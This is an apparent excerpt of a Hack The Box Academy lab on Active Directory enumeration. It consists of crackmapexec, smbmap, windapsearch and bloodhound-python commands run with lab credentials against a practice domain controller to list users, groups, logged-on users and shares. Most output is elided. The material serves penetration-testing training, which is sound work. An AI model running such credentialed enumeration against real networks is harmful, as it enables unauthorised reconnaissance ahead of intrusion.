...
```shell-session
trmchale@htb[/htb]$ crackmapexec -h
...
```shell-session
trmchale@htb[/htb]$ crackmapexec smb -h
...
```shell-session
trmchale@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
...
```shell-session
trmchale@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
...
```shell-session
trmchale@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
...
```shell-session
trmchale@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
...
```shell-session
trmchale@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
...
```shell-session
trmchale@htb[/htb]$ head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
...
```shell-session
trmchale@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
...
```shell-session
trmchale@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
...
```shell-session
trmchale@htb[/htb]$ windapsearch.py -h
...
```shell-session
trmchale@htb[/htb]$ bloodhound-python -h
